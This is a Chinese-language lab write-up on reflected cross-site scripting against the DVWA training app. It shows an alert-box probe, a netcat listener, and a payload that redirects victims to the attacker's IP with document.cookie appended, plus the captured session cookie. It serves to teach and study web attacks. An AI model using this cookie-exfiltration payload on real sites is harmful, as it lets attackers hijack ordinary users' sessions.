## 跨站脚本技术XSS(Cross-Site Scripting)
1. 之前的攻击目标是服务器，而XSS目标是浏览网站的普通人
2. 通过XSS可以偷到登陆凭证(Cookies)、伪装成他们进行操作、导向假网站
## 攻击流程
1. 漏洞侦测
    - DVWA Security的安全级别设置为low
    - XSS(Reflected)功能模块，提交经典的XSS测试向量:`<script>alert('XSS')</script>`，浏览器呈现一个内容为"XSS"的警告对话框，说明服务器未对输入进行充分过滤，而是直接嵌入HTML响应中。浏览器解析到`<script>`元素后，即刻执行内部的JavaScript代码。
2. 攻击环境配置与Payload(有效载荷)构建
    - Kali Linux终端，执行`nc -lvp 1234`启动该监听服务，`nc`执行`netcat`，`-l`启动监听模式，`-v`启动详细输出模式，`-p 1234`指定监听的端口号为1234
    - `<script>document.location='http://192.168.174.129:1234/?cookie=' + document.cookie;</script>`
    - Payload逻辑：强制浏览器重定向至一个新的URL，该URL指向攻击机的IP地址及监听端口1234，通过`document.cookie`获取的Cookie字符串，将作为查询参数(`?cookie=`)附加到URL的末尾
3. 结果观测
    - **浏览器端：**页面发生一次快速重定向，并可能由于`netcat`服务无法提供有效的HTTP响应而显示连接错误
    - **攻击机终端：**切换至运行`netcat`的终端窗口，可以观测到一条新的HTTP GET请求，包含了被盗取的Cookie信息
    - **结论：**`PHPSESSID=...`部分的成功接收，标志着用户的会话Cooie已被成功窃取
      <img width="666" height="244" alt="image" src="https://github.com/user-attachments/assets/d90833f9-bd13-401d-a5fe-a816462eb56f" />  
## 总结
1. `connect to [192.168.174.129] from ...`说明一个连接请求从受害者发送到了netcat
2. `GET /?cookie=security=low;%20PHPSESSID=129f6e5a4c8cbd494411abc173bb2512 HTTP/1.1`，`GET /?cookie=...`是构造的Payload`document.location=...`产生的效果，`PHPSESSID=...`是用户的**会话凭证**，拥有此，攻击者可在不知道用户名和密码的情况下，冒充此用户登录网站
